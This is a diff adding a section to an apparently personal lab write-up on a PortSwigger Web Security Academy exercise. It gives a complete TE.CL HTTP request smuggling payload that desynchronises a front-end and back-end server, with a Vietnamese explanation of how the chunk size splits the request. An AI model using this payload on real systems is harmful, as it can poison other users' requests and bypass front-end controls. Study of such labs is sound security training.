@@ -150,3 +150,65 @@ x: x
 
 <img width="602" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/40fdc7bd-3f12-465f-b85c-d8cbe831ec94">
 
+***
+## 5. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+* Content:
+```
+This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.
+
+To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
+```
+
+* Exploit:
+
+```
+POST / HTTP/1.1
+Host: 0a8a0045041de09184d61ec300a80066.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+a=b
+0
+
+
+```
+Giải thích: 
+- 5e unhex = 94 = Độ dài của phần 
+```
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+a=b
+```
+- Do backend không hỗ trợ `Transfer-Encoding` + `Content-Lenghth: 4` => Phần sau 5e sẽ được backend hiểu là thuộc Request riêng biệt.
+- Request riêng này như sau:
+```
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+x=1POST / HTTP/1.1
+```
+
+<img width="479" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c9dce484-9eaf-40a5-9d59-fb9a60f608f0">
+
